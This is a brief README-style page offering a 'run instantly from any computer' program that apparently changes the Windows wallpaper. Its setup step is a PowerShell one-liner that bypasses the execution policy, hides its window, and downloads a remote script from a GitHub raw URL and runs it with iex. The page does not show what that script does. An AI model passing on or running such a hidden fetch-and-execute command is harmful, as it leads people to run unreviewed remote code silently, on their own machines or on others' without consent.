## Run the program instantly from any computer

No installation or prerequisites are needed. The program runs hidden in the background, and the wallpaper it sets stays in Windows' cache. To stop it, restart the device or end the PowerShell process in Task Manager.

### Setup

Press **Win + R**, paste the command below, and press Enter:

```powershell
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/Kiyan-7/telaviv/main/reminders.ps1 | iex"
```
